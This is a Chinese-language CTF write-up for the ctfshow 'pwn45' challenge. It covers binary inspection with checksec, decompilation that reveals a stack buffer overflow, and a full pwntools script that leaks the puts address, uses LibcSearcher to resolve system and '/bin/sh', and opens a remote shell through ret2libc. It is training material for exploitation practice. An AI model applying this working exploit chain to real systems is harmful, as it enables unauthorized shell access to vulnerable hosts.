```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn45
```

```
tasike@tasike-VM:~/Desktop$ file pwn45
pwn45: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=daca4e97fee9518013430f055b900aa210acd090, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn45
[*] '/home/tasike/Desktop/pwn45'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  puts("O.o?");
  ctfshow();
  write(0, "Hello CTFshow!\n", 0xEu);
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[103]; // [esp+Dh] [ebp-6Bh] BYREF

  return read(0, buf, 0xC8u);
}
```

> `buf`与`ebp`距离`0x6B`

发现没有`system`函数和`/bin/sh`字符串

因此考虑利用`ret2libc`



编写`attack45.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28196)
elf = ELF('./pwn45')
main = elf.sym['main']
puts_plt = elf.plt['puts']
# print(hex(puts_plt)) 实际上打印出来的就是ida中的puts的0x08048390
puts_got = elf.got['puts']
# print(hex(puts_got))
payload = cyclic(0x6B + 0x4) + p32(puts_plt) + p32(main) + p32(puts_got)
r.sendline(payload)
puts = u32(r.recvuntil('\xf7')[-4:])
print(hex(puts))  # 泄露puts真实地址

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x6B + 0x4) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)
r.interactive()
```

